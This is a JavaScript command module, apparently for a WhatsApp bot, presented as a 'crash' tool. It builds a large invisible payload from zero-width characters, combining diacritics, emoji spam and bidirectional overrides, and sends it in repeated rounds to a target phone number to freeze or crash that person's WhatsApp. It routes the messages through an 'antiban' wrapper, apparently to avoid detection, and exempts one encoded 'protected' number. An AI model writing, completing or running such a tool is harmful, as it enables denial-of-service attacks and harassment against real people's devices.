/**
 * Cyber Bug 
 * Sends heavy Unicode messages that freeze/crash WhatsApp immediately.
...
const PROTECTED_ENCODED = [
  'MjYzNzg5NzQ1Mjc3'  // dont change anything here 
];
...
function generateInvisiblePayload() {
  // Zero-width spaces, joiners, and directional marks – invisible to the eye
  const zwsp = '\u200B'.repeat(15000);
  const zwj = '\u200D'.repeat(5000);
  const lrm = '\u200E'.repeat(5000);
  const rlm = '\u200F'.repeat(5000);

  // Combining diacritics – forces heavy glyph recomposition
  ...
  // Emoji spam – high memory footprint
  const emojis = '😀😁😂🤣😃😄😅😆😉😊😋😎😍🥰😘😗😙😚☺️🙂🤗🤩🤔🤨😐😑😶🙄😏😣😥😮😯😪😫😴😌😛😜😝🤤😒😓😔😕🙃🤑😲☹️🙁😖😞😟😤😢😭😦😧😨😩🤯😬😰😱🥵🥶😳🤪😵😡😠🤬';
  const emojiSpam = emojis.repeat(400);

  // Bidirectional override – confuses the layout engine
  const bidi = '\u202E' + 'THIS WILL BE REVERSED' + '\u202C';
  const bidiSpam = bidi.repeat(1000);

  // Combine into a ~60k character string – mostly invisible
  let payload = zwsp + '\n'.repeat(3000)
              + zwj + '\n'.repeat(2000)
              + lrm + rlm + '\n'.repeat(2000)
              + diacriticSpam + '\n'.repeat(2000)
              + emojiSpam + '\n'.repeat(2000)
              + bidiSpam + '\n'.repeat(1000)
              + '🔥'; // tiny visible marker to ensure the message isn't completely empty
...
module.exports = async (sock, msg, args, { isOwner, sender, jid, config: cfg, db: database }) => {
  ...
  if (!targetNumber) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Invisible Direct Crash*\n\n*Usage:* ${config.prefix}crash <number> [rounds]\n*Example:* ${config.prefix}crash 263xxxx 3\n\n`,
    }, { quoted: msg });
  }
  ...
  await antiban.sendHuman(sock, jid, {
    text: `🐛 *Sending invisible crash payloads...*\n🎯 Target: ${targetNumber}\n💣 Rounds: ${rounds}`,
  }, { quoted: msg });

  // 6. Send each round as a normal text message (invisible)
